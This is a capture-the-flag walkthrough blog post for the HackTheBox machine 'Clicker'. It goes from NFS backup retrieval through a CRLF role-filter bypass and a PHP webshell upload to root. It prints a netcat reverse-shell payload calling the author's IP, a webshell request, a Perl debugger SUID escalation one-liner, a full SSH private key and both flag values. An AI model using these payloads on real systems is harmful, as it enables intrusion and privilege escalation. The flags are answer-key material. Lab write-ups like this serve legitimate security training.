---
title: "Clicker"
description: "Another Medium! Hopefully it doesn't kick my ass as much..."
pubDate: 2024-01-05
author: "sealldev"
section: "HackTheBox"
image: "images/htb/box/clicker/icon.png"
tags: ["medium", "hackthebox-machine"]
---

**Machine created by:** [Nooneeye](https://app.hackthebox.com/users/166251)

## Recon

Port scan with nmap to start it off:

```
$ sudo nmap 10.10.11.232 --top-ports 2500
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 03:24 AEDT
Nmap scan report for 10.10.11.232
Host is up (0.077s latency).
Not shown: 2496 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs
```

And adding the `/etc/hosts` entry:

```
10.10.11.232 clicker.htb
```

Browsing the HTTP seems to be a clicker game with user registration, and a small game.

![Main](images/htb/box/clicker/main.png)

Looking at the ports there is also a NFS entry on port 2049, let's look into that.

```
$ showmount -e 10.10.11.232
Exports list on 10.10.11.232:
/mnt/backups                        *

$ sudo mount -o resvport -t nfs 10.10.11.232:/mnt/backups /private/nfs
$ ls /private/nfs
clicker.htb_backup.zip
$ cp /private/nfs/clicker.htb_backup.zip /tmp/
```

After looking at the share and finding a backup, inside the zip is a complete backup of the sites infrastructure with full PHP source code.

I then looked in `save-game.php` and was looking at potentially injecting the `role` key.

```php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
```

## Exploitation

I ended up using a CRLF to bypass the filter with the following request:

```
GET /save_game.php?clicks=11&level=111&role%0a=Admin HTTP/1.1
Host: clicker.htb
```

I then (which has me stalled for a, surprisingly long time...) had to log in and out to visit `admin.php` properly.

![Admin](images/htb/box/clicker/admin.png)

Once inside I saw we could export a list of users as JSON, TXT or HTML.

Looking at the source of `exports.php` no extension filtering occurs, so we can create a `.php` file, now we just have to put a shell in.

```php
...
$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
...
```

Looking back at our parameter injection code, we can insert a new value for the `nickname` parameter post-registration which is a [tiny PHP webshell](https://github.com/bayufedra/Tiny-PHP-Webshell#simple-http-requests-get-method-shell).

```
GET /save_game.php?clicks=8794732211&level=11&nickname=<?=`$_GET[0]`?>&role%0a=Admin HTTP/1.1
Host: clicker.htb
```

I now generate a new export with the `.php` extension.

```
POST /export.php HTTP/1.1
Host: clicker.htb

threshold=1&extension=php
```

Visiting the export gives us a mostly blank page, until we use `?0=whoami` in the paramter and we get this!

`www-data 	8794732211 	11`

## Inital Access

I then created a URL encoded reverse shell from RevShells:

`?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.***.***%204444%20%3E%2Ftmp%2Ff`

And setup a listener locally using `pwncat`.

```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen --host 10.10.***.*** 4444 -m linux
[16:41:53] new listener created for 10.10.***.***:4444
(local) pwncat$
```

And we get a response!

```
[05:17:22] 10.10.11.232:51072: upgrading from /usr/sbin/nologin to /usr/bin/bash
[05:17:23] 10.10.11.232:51072: registered new host w/ db
[05:17:24] listener: 10.10.16.9:4444: linux session from 10.10.11.232:51072
           established
```

## User Flag

Looking for files owned by the user `jack` (seen in the `/home` directory) shows some interesting results in the `/opt` folder.

```
$ find / -user jack 2>/dev/null
/home/jack
/opt/manage
/opt/manage/README.txt
/opt/manage/execute_query
$ ls /opt/manage
README.txt execute_query
$ cat README.txt
Web application Management

Use the binary to execute the following task:
	- 1: Creates the database structure and adds user admin
	- 2: Creates fake players (better not tell anyone)
	- 3: Resets the admin password
	- 4: Deletes all users except the admin
```

After, **alot** of time... I found using values <4 for the binary input is a read file function, so we can read the SSH keys of `jack` by doing this:

```
$ ./execute_query 5 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
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
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

I put the key into `jack.key` on my local machine and ran the following:

```
$ chmod 600 jack.key
$ ssh jack@clicker.htb -i jack.key
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)
...
-bash-5.1$ cat user.txt
52451aacf5ceeb84caf5355fe3d2d30f
```

And there's our user flag! 

Flag: `52451aacf5ceeb84caf5355fe3d2d30f`

## Root Flag

Running `sudo -l` gives us some entries:

```
$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

Looking at the contents of `/opt/monitor.sh` we see this:

```sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

Looking at `PERL5LIB` being unset, and looking inside `/usr/bin/xml_pp`, I assume this is vulnerable to [CVE-2016-1531](https://github.com/0xsyr0/OSCP#cve-2016-1531-exim-lpe)

As we can't write any files to the directory, we can do it by setting a SUID to `/bin/bash`

```
$ sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
	(Maybe you meant system() when you said exec()?)
$ /bin/bash -p
$ cat /root/root.txt
59e97b75b4b6daac788914d2ece50c4c
```

And there's the root flag! 

Flag: `59e97b75b4b6daac788914d2ece50c4c`


Success!

![Success](images/htb/box/clicker/submitted.png)